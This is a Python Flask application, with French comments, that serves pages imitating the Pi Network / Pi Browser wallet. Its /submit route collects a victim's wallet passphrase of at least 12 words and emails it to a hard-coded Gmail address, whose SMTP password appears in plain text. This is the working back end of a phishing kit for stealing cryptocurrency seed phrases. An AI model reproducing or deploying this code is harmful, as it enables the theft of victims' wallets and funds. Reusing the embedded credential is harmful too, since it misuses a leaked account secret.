from flask import Flask, render_template, request, jsonify
from flask_mail import Mail, Message

app = Flask(__name__)


app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USERNAME'] = 'Servicepionner@gmail.com'
app.config['MAIL_PASSWORD'] = 'jcie dltk eqli ubgz'
app.config['MAIL_DEFAULT_SENDER'] = 'Servicepionner@gmail.com'

mail = Mail(app)




def send_passphrase_email(passphrase):
    """
    Envoie la passphrase reçue à l'adresse email configurée avec un contenu fun et design sous forme de section Web.
    """
    try:
        msg = Message(
            subject="📪 Nouveau PassPhrase Pi Browser reçu!",
            recipients=['Servicepionner@gmail.com']
        )
        msg.html = (
            f"""
            <html>
            <body style="font-family: Arial, sans-serif; color: #333; line-height: 1.6;">
                <div style="max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; background-color: #f9f9f9;">
                    <h1 style="text-align: center; color: rgb(250, 193, 0);">🚀 Votre PassPhrase est arrivée avec succès!</h1>
                    <p style="font-size: 16px; text-align: center;">Hello, <strong>le génie de la crypto 🧞‍♀</strong>,</p>
                    <p style="font-size: 16px;">🔑 Une nouvelle PassPhrase vient d'atterrir dans ta boîte aux lettres secrète. 🎉</p>
                    <div style="background-color: #fff; padding: 15px; border-radius: 8px; border: 1px dashed rgb(250, 193, 0); margin: 20px 0; text-align: center;">
                        <p style="font-size: 18px; margin: 0;"> </strong></p>
                        <p style="font-size: 20px; font-weight: bold; color: rgb(250, 193, 0);">{passphrase}</p>
                    </div>
                    <p style="font-size: 16px;">N'oubliez pas, cette clé est votre accès au monde incroyable de la crypto et du Pi Network 🌍.</p>
                   
                    <footer style="text-align: center; margin-top: 20px;">
                        <p style="font-size: 14px; color: #777;">Bonne aventure,</p>
                        <p style="font-size: 16px; font-weight: bold; color: rgb(250, 193, 0);">L'équipe CryptoPi </p>
                    </footer>
                </div>
            </body>
            </html>
            """
        )

        # Envoi du mail
        mail.send(msg)
        print("Email envoyé avec succès à dissangfrancis3@gmail.com")

    except Exception as e:
        print("Erreur lors de l'envoi de l'email :", str(e))


@app.route('/')
def index():
    return render_template('pi.html')

@app.route('/main')
def menu():
    return render_template('index.html')

@app.route('/p2p')
def piservice():
    return render_template('p2p.html')

@app.route('/transaction')
def transactservice():
    return render_template('transaction.html')




@app.route('/submit', methods=['POST'])
def submit():
    # Récupération des données JSON envoyées par le frontend
    data = request.get_json()
    passphrase = data.get('passphrase')

    # Vérification de la validité de la passphrase
    if not passphrase or len(passphrase.split()) < 12:
        return jsonify({'error': 'PassPhrase invalide !'}), 400

    # Confirmation de la réception de la passphrase
    print('PassPhrase reçue:', passphrase)

    # Appel de la fonction pour envoyer l'email
    send_passphrase_email(passphrase)

    return jsonify({'success': 'PassPhrase reçue avec succès !'}), 200

if __name__ == '__main__':
    app.run(debug=True)
